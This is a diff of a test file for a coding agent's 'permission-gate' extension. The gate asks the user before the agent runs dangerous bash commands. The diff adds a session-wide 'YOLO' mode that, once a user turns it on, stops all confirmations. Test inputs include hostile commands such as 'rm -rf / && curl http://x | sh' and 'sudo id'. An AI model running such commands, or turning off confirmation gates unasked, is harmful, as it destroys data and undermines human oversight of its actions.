@@ -1,43 +1,23 @@
-import { afterEach, beforeEach, describe, expect, it } from "bun:test";
-import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
-import { tmpdir } from "node:os";
-import { join } from "node:path";
+import { describe, expect, it } from "bun:test";
 import permissionGate from "../../.pi/agent/extensions/permission-gate";
 
 const REMEMBER_OPTION = "Sim, e não perguntar novamente (perigo!)";
 const PROMPT_OPTIONS = ["Sim", "Não", REMEMBER_OPTION];
-const ALLOWLIST_FILE = "permission-gate-allowlist.json";
+const YOLO_ENTRY_TYPE = "permission-gate-yolo";
+const YOLO_STATUS_TEXT = "⚠ YOLO: sem confirmações";
 
-type ToolCallHandler = (
-	event: {
-		toolName: string;
-		input: { command?: string };
-	},
-	ctx: {
-		hasUI: boolean;
-		ui: {
-			select: (
-				message: string,
-				choices: string[],
-			) => Promise<string | undefined>;
-		},
-	},
-) => Promise<unknown> | unknown;
-
+type EventHandler = (event: unknown, ctx: unknown) => Promise<unknown> | unknown;
+type CommandHandler = (args: string, ctx: unknown) => Promise<void> | void;
 type Notification = { message: string; type?: "info" | "warning" | "error" };
-
-type EmittedEvent = {
-	name: string;
-	data: unknown;
-};
+type StatusUpdate = { key: string; text: string | undefined };
+type EmittedEvent = { name: string; data: unknown };
+type SessionEntry = { type: "custom"; customType: string; data?: unknown };
 
 function setupPermissionGate(options?: { emitThrows?: boolean }) {
-	let handler: ToolCallHandler | undefined;
+	const handlers = new Map<string, EventHandler>();
 	const emitted: EmittedEvent[] = [];
-	const commands = new Map<
-		string,
-		(args: string, ctx: unknown) => Promise<void>
-	>();
+	const entries: unknown[] = [];
+	const commands = new Map<string, CommandHandler>();
 
 	const pi = {
 		events: {
@@ -48,25 +28,25 @@ function setupPermissionGate(options?: { emitThrows?: boolean }) {
 				emitted.push({ name, data });
 			},
 		},
-		on(name: string, callback: ToolCallHandler) {
-			expect(name).toBe("tool_call");
-			handler = callback;
+		on(name: string, callback: EventHandler) {
+			handlers.set(name, callback);
 		},
-		registerCommand(
-			name: string,
-			options: { handler: (args: string, ctx: unknown) => Promise<void> },
-		) {
+		registerCommand(name: string, options: { handler: CommandHandler }) {
 			commands.set(name, options.handler);
+		},
+		appendEntry(customType: string, data?: unknown) {
+			entries.push({ customType, data });
 		},
 	};
 
 	permissionGate(pi as never);
 
-	if (!handler) {
+	const toolCall = handlers.get("tool_call");
+	if (!toolCall) {
 		throw new Error("permission gate did not register a tool_call handler");
 	}
 
-	return { handler, emitted, commands };
+	return { handlers, toolCall, emitted, entries, commands };
 }
 
 function bashEvent(command: string) {
@@ -76,163 +56,115 @@ function bashEvent(command: string) {
 	};
 }
 
-function uiContext(
-	select: (message: string, choices: string[]) => Promise<string | undefined>,
-	notifications: Notification[] = [],
-) {
+interface ContextOptions {
+	select?: (message: string, choices: string[]) => Promise<string | undefined>;
+	hasUI?: boolean;
+	branch?: SessionEntry[];
+	notifications?: Notification[];
+	statuses?: StatusUpdate[];
+}
+
+function makeContext(options: ContextOptions = {}) {
+	const notifications = options.notifications ?? [];
+	const statuses = options.statuses ?? [];
+
 	return {
-		hasUI: true,
+		hasUI: options.hasUI ?? true,
+		sessionManager: {
+			getBranch: () => options.branch ?? [],
+		},
 		ui: {
-			select,
+			select:
+				options.select ??
+				(async () => {
+					throw new Error("select should not be called");
+				}),
 			notify(message: string, type?: "info" | "warning" | "error") {
 				notifications.push({ message, type });
+			},
+			setStatus(key: string, text: string | undefined) {
+				statuses.push({ key, text });
 			},
 		},
 	};
 }
 
-function noUiContext(notifications: Notification[] = []) {
-	return {
-		hasUI: false,
-		ui: {
-			select: async () => {
-				throw new Error("select should not be called without UI");
-			},
-			notify(message: string, type?: "info" | "warning" | "error") {
-				notifications.push({ message, type });
-			},
-		},
-	};
+function yoloBranch(...actives: boolean[]): SessionEntry[] {
+	return actives.map((active) => ({ type: "custom", customType: YOLO_ENTRY_TYPE, data: { active } }));
 }
 
-function allowlistFile(): string {
-	return join(process.env.PI_CODING_AGENT_DIR!, ALLOWLIST_FILE);
-}
-
-function readAllowlistFile(): string[] {
-	return JSON.parse(readFileSync(allowlistFile(), "utf-8")).commands;
-}
-
-function seedAllowlist(commands: string[]) {
-	writeFileSync(allowlistFile(), JSON.stringify({ commands }), "utf-8");
-}
-
-let configDir: string;
-const originalConfigDir = process.env.PI_CODING_AGENT_DIR;
-
-beforeEach(() => {
-	configDir = mkdtempSync(join(tmpdir(), "permission-gate-test-"));
-	process.env.PI_CODING_AGENT_DIR = configDir;
-});
-
-afterEach(() => {
-	if (originalConfigDir === undefined) {
-		delete process.env.PI_CODING_AGENT_DIR;
-	} else {
-		process.env.PI_CODING_AGENT_DIR = originalConfigDir;
-	}
-	rmSync(configDir, { recursive: true, force: true });
-});
+const HERDR_WAITING = {
+	name: "herdr:blocked",
+	data: { active: true, label: "Aguardando permissão" },
+};
+const HERDR_CLEARED = { name: "herdr:blocked", data: { active: false } };
 
 describe("permission-gate", () => {
 	it("does not block safe bash commands or emit Herdr blocked events", async () => {
-		const { handler, emitted } = setupPermissionGate();
+		const { toolCall, emitted } = setupPermissionGate();
 
-		const result = await handler(
-			bashEvent("echo hello"),
-			uiContext(async () => {
-				throw new Error("select should not be called for safe commands");
-			}),
-		);
+		const result = await toolCall(bashEvent("echo hello"), makeContext());
 
 		expect(result).toBeUndefined();
 		expect(emitted).toEqual([]);
 	});
 
 	it("emits Herdr blocked while waiting for permission and allows when user selects Sim", async () => {
-		const { handler, emitted } = setupPermissionGate();
-		const promptEvents: string[] = [];
+		const { toolCall, emitted } = setupPermissionGate();
 
-		const result = await handler(
+		const result = await toolCall(
 			bashEvent("sudo id"),
-			uiContext(async (message, choices) => {
-				promptEvents.push(message);
-				expect(choices).toEqual(PROMPT_OPTIONS);
-				expect(emitted).toEqual([
-					{
-						name: "herdr:blocked",
-						data: { active: true, label: "Aguardando permissão" },
-					},
-				]);
-				return "Sim";
+			makeContext({
+				select: async (message, choices) => {
+					expect(choices).toEqual(PROMPT_OPTIONS);
+					expect(message).toContain("sudo id");
+					expect(emitted).toEqual([HERDR_WAITING]);
+					return "Sim";
+				},
 			}),
 		);
 
 		expect(result).toBeUndefined();
-		expect(promptEvents).toHaveLength(1);
-		expect(promptEvents[0]).toContain("sudo id");
-		expect(emitted).toEqual([
-			{
-				name: "herdr:blocked",
-				data: { active: true, label: "Aguardando permissão" },
-			},
-			{
-				name: "herdr:blocked",
-				data: { active: false },
-			},
-		]);
+		expect(emitted).toEqual([HERDR_WAITING, HERDR_CLEARED]);
 	});
 
 	it("clears Herdr blocked and blocks command when user selects Não", async () => {
-		const { handler, emitted } = setupPermissionGate();
+		const { toolCall, emitted } = setupPermissionGate();
 
-		const result = await handler(
+		const result = await toolCall(
 			bashEvent("rm -rf build"),
-			uiContext(async () => "Não"),
+			makeContext({ select: async () => "Não" }),
 		);
 
 		expect(result).toEqual({ block: true, reason: "Bloqueado pelo usuário" });
-		expect(emitted).toEqual([
-			{
-				name: "herdr:blocked",
-				data: { active: true, label: "Aguardando permissão" },
-			},
-			{
-				name: "herdr:blocked",
-				data: { active: false },
-			},
-		]);
+		expect(emitted).toEqual([HERDR_WAITING, HERDR_CLEARED]);
 	});
 
 	it("clears Herdr blocked when permission prompt throws", async () => {
-		const { handler, emitted } = setupPermissionGate();
+		const { toolCall, emitted } = setupPermissionGate();
 		const expectedError = new Error("prompt failed");
 
 		await expect(
-			handler(
+			toolCall(
 				bashEvent("sudo id"),
-				uiContext(async () => {
-					throw expectedError;
+				makeContext({
+					select: async () => {
+						throw expectedError;
+					},
 				}),
 			),
 		).rejects.toBe(expectedError);
 
-		expect(emitted).toEqual([
-			{
-				name: "herdr:blocked",
-				data: { active: true, label: "Aguardando permissão" },
-			},
-			{
-				name: "herdr:blocked",
-				data: { active: false },
-			},
-		]);
+		expect(emitted).toEqual([HERDR_WAITING, HERDR_CLEARED]);
 	});
 
 	it("blocks dangerous commands without UI and emits no Herdr blocked events", async () => {
-		const { handler, emitted } = setupPermissionGate();
+		const { toolCall, emitted } = setupPermissionGate();
 
-		const result = await handler(bashEvent("sudo id"), noUiContext());
+		const result = await toolCall(
+			bashEvent("sudo id"),
+			makeContext({ hasUI: false }),
+		);
 
 		expect(result).toEqual({
 			block: true,
@@ -242,15 +174,17 @@ describe("permission-gate", () => {
 	});
 
 	it("continues permission prompt behavior when Herdr event emission fails", async () => {
-		const { handler, emitted } = setupPermissionGate({ emitThrows: true });
+		const { toolCall, emitted } = setupPermissionGate({ emitThrows: true });
 		let selectCalls = 0;
 
-		const result = await handler(
+		const result = await toolCall(
 			bashEvent("sudo id"),
-			uiContext(async (_message, choices) => {
-				selectCalls += 1;
-				expect(choices).toEqual(PROMPT_OPTIONS);
-				return "Sim";
+			makeContext({
+				select: async (_message, choices) => {
+					selectCalls += 1;
+					expect(choices).toEqual(PROMPT_OPTIONS);
+					return "Sim";
+				},
 			}),
 		);
 
@@ -259,161 +193,179 @@ describe("permission-gate", () => {
 		expect(emitted).toEqual([]);
 	});
 
-	it("remembers the exact command when user selects the remember option", async () => {
-		const { handler, emitted } = setupPermissionGate();
+	it("turns YOLO mode on when the user selects the remember option", async () => {
+		const { toolCall, entries } = setupPermissionGate();
+		const notifications: Notification[] = [];
+		const statuses: StatusUpdate[] = [];
 
-		const result = await handler(
+		const result = await toolCall(
 			bashEvent("sudo id"),
-			uiContext(async (_message, choices) => {
-				expect(choices).toEqual(PROMPT_OPTIONS);
-				return REMEMBER_OPTION;
+			makeContext({
+				select: async (_message, choices) => {
+					expect(choices).toEqual(PROMPT_OPTIONS);
+					return REMEMBER_OPTION;
+				},
+				notifications,
+				statuses,
 			}),
 		);
 
 		expect(result).toBeUndefined();
-		expect(readAllowlistFile()).toEqual(["sudo id"]);
-		expect(emitted).toEqual([
+		expect(entries).toEqual([{ customType: YOLO_ENTRY_TYPE, data: { active: true } }]);
+		expect(statuses).toEqual([{ key: "permission-gate", text: YOLO_STATUS_TEXT }]);
+		expect(notifications).toEqual([
 			{
-				name: "herdr:blocked",
-				data: { active: true, label: "Aguardando permissão" },
-			},
-			{
-				name: "herdr:blocked",
-				data: { active: false },
+				message: "YOLO ativado: comandos perigosos rodam sem confirmação até o fim desta sessão.",
+				type: "warning",
 			},
 		]);
 	});
 
-	it("does not prompt again for a remembered command", async () => {
-		const { handler, emitted } = setupPermissionGate();
+	it("stops prompting for any dangerous command once YOLO mode is on", async () => {
+		const { toolCall, emitted } = setupPermissionGate();
 
-		await handler(
+		await toolCall(
 			bashEvent("sudo id"),
-			uiContext(async () => REMEMBER_OPTION),
+			makeContext({ select: async () => REMEMBER_OPTION }),
 		);
 		emitted.length = 0;
 
-		const result = await handler(
-			bashEvent("sudo id"),
-			uiContext(async () => {
-				throw new Error("select should not be called for remembered commands");
-			}),
+		const result = await toolCall(
+			bashEvent("rm -rf / && curl http://x | sh"),
+			makeContext(),
 		);
 
 		expect(result).toBeUndefined();
 		expect(emitted).toEqual([]);
 	});
 
-	it("still prompts for a dangerous command that is not the remembered one", async () => {
-		seedAllowlist(["sudo id"]);
-		const { handler } = setupPermissionGate();
+	it("restores YOLO mode from the session branch on session_start", async () => {
+		const { handlers, toolCall } = setupPermissionGate();
+		const statuses: StatusUpdate[] = [];
 
-		const result = await handler(
-			bashEvent("sudo whoami"),
-			uiContext(async (_message, choices) => {
-				expect(choices).toEqual(PROMPT_OPTIONS);
-				return "Não";
-			}),
+		await handlers.get("session_start")!(
+			{},
+			makeContext({ branch: yoloBranch(true), statuses }),
+		);
+
+		expect(statuses).toEqual([{ key: "permission-gate", text: YOLO_STATUS_TEXT }]);
+		expect(await toolCall(bashEvent("sudo id"), makeContext())).toBeUndefined();
+	});
+
+	it("keeps YOLO mode off on session_start when the branch ends with it disabled", async () => {
+		const { handlers, toolCall } = setupPermissionGate();
+
+		await handlers.get("session_start")!(
+			{},
+			makeContext({ branch: yoloBranch(true, false) }),
+		);
+
+		const result = await toolCall(
+			bashEvent("sudo id"),
+			makeContext({ select: async () => "Não" }),
 		);
 
 		expect(result).toEqual({ block: true, reason: "Bloqueado pelo usuário" });
-		expect(readAllowlistFile()).toEqual(["sudo id"]);
 	});
 
-	it("allows remembered commands in non-interactive mode but still blocks the rest", async () => {
-		seedAllowlist(["sudo id"]);
-		const { handler } = setupPermissionGate();
+	it("ignores a restored YOLO mode when there is no UI", async () => {
+		const { handlers, toolCall } = setupPermissionGate();
+		const statuses: StatusUpdate[] = [];
 
-		expect(await handler(bashEvent("sudo id"), noUiContext())).toBeUndefined();
-		expect(await handler(bashEvent("rm -rf /"), noUiContext())).toEqual({
+		await handlers.get("session_start")!(
+			{},
+			makeContext({ hasUI: false, branch: yoloBranch(true), statuses }),
+		);
+
+		expect(statuses).toEqual([]);
+		expect(
+			await toolCall(bashEvent("sudo id"), makeContext({ hasUI: false })),
+		).toEqual({
 			block: true,
 			reason: "Comando perigoso bloqueado (modo não interativo)",
 		});
 	});
 
-	it("ignores a corrupted allowlist file instead of failing open", async () => {
-		writeFileSync(allowlistFile(), "not json", "utf-8");
-		const { handler } = setupPermissionGate();
+	it("re-reads YOLO mode from the branch on session_tree navigation", async () => {
+		const { handlers, toolCall } = setupPermissionGate();
 
-		const result = await handler(
+		await handlers.get("session_start")!(
+			{},
+			makeContext({ branch: yoloBranch(true) }),
+		);
+		expect(await toolCall(bashEvent("sudo id"), makeContext())).toBeUndefined();
+
+		// The user rewinds to a branch that predates the YOLO toggle.
+		await handlers.get("session_tree")!({}, makeContext({ branch: [] }));
+
+		const result = await toolCall(
 			bashEvent("sudo id"),
-			uiContext(async (_message, choices) => {
-				expect(choices).toEqual(PROMPT_OPTIONS);
-				return "Não";
-			}),
+			makeContext({ select: async () => "Não" }),
 		);
 
 		expect(result).toEqual({ block: true, reason: "Bloqueado pelo usuário" });
 	});
 
-	it("keeps prompting when the allowlist cannot be persisted", async () => {
-		const blockedDir = join(configDir, "not-a-directory");
-		writeFileSync(blockedDir, "", "utf-8");
-		process.env.PI_CODING_AGENT_DIR = blockedDir;
-
-		const { handler } = setupPermissionGate();
+	it("toggles YOLO mode through /permission-gate on and /permission-gate off", async () => {
+		const { commands, toolCall, entries } = setupPermissionGate();
 		const notifications: Notification[] = [];
-		let prompted = 0;
+		const statuses: StatusUpdate[] = [];
+		const ctx = makeContext({ notifications, statuses });
 
-		const chooseRemember = uiContext(async (_message, choices) => {
-			prompted += 1;
-			expect(choices).toEqual(PROMPT_OPTIONS);
-			return REMEMBER_OPTION;
-		}, notifications);
+		await commands.get("permission-gate")!("on", ctx);
 
-		expect(await handler(bashEvent("sudo id"), chooseRemember)).toBeUndefined();
-		expect(prompted).toBe(1);
-		expect(notifications).toHaveLength(1);
+		expect(entries).toEqual([{ customType: YOLO_ENTRY_TYPE, data: { active: true } }]);
+		expect(statuses).toEqual([{ key: "permission-gate", text: YOLO_STATUS_TEXT }]);
 		expect(notifications[0]?.type).toBe("warning");
+		expect(await toolCall(bashEvent("sudo id"), makeContext())).toBeUndefined();
 
-		// The exception was not stored, so the next identical command prompts again.
-		expect(await handler(bashEvent("sudo id"), chooseRemember)).toBeUndefined();
-		expect(prompted).toBe(2);
-	});
+		await commands.get("permission-gate")!("off", ctx);
 
-	it("clears all exceptions through /permission-gate limpar", async () => {
-		seedAllowlist(["sudo id", "rm -rf build"]);
-		const { commands } = setupPermissionGate();
-		const notifications: Notification[] = [];
-
-		await commands.get("permission-gate")!("limpar", uiContext(async () => undefined, notifications));
-
-		expect(readAllowlistFile()).toEqual([]);
-		expect(notifications).toEqual([
-			{ message: "Exceções do permission-gate removidas.", type: "info" },
+		expect(entries).toEqual([
+			{ customType: YOLO_ENTRY_TYPE, data: { active: true } },
+			{ customType: YOLO_ENTRY_TYPE, data: { active: false } },
 		]);
+		expect(statuses[1]).toEqual({ key: "permission-gate", text: undefined });
+		expect(
+			await toolCall(
+				bashEvent("sudo id"),
+				makeContext({ select: async () => "Sim" }),
+			),
+		).toBeUndefined();
 	});
 
-	it("revokes a single exception through the /permission-gate selector", async () => {
-		seedAllowlist(["sudo id", "rm -rf build"]);
+	it("reports YOLO mode status through bare /permission-gate", async () => {
+		const { commands } = setupPermissionGate();
+		const notifications: Notification[] = [];
+		const ctx = makeContext({ notifications });
+
+		await commands.get("permission-gate")!("", ctx);
+		expect(notifications).toEqual([
+			{
+				message: "YOLO desativado: comandos perigosos pedem confirmação.",
+				type: "info",
+			},
+		]);
+
+		await commands.get("permission-gate")!("on", ctx);
+		await commands.get("permission-gate")!("", ctx);
+		expect(notifications[2]).toEqual({
+			message: "YOLO ativo: esta extensão não confirma nenhum comando nesta sessão.",
+			type: "info",
+		});
+	});
+
+	it("rejects unknown /permission-gate arguments with usage", async () => {
 		const { commands } = setupPermissionGate();
 		const notifications: Notification[] = [];
 
 		await commands.get("permission-gate")!(
-			"",
-			uiContext(async (_message, choices) => {
-				expect(choices).toEqual(["Limpar todas (2)", "1. sudo id", "2. rm -rf build"]);
-				return "1. sudo id";
-			}, notifications),
-		);
-
-		expect(readAllowlistFile()).toEqual(["rm -rf build"]);
-		expect(notifications).toEqual([{ message: "Revogado: sudo id", type: "info" }]);
-	});
-
-	it("reports when there are no exceptions to review", async () => {
-		const { commands } = setupPermissionGate();
-		const notifications: Notification[] = [];
-
-		await commands.get("permission-gate")!(
-			"",
-			uiContext(async () => {
-				throw new Error("select should not be called without exceptions");
-			}, notifications),
+			"talvez",
+			makeContext({ notifications }),
 		);
 
 		expect(notifications).toEqual([
-			{ message: "Nenhuma exceção do permission-gate registrada.", type: "info" },
+			{ message: "Uso: /permission-gate [on|off]", type: "warning" },
 		]);
 	});
 });
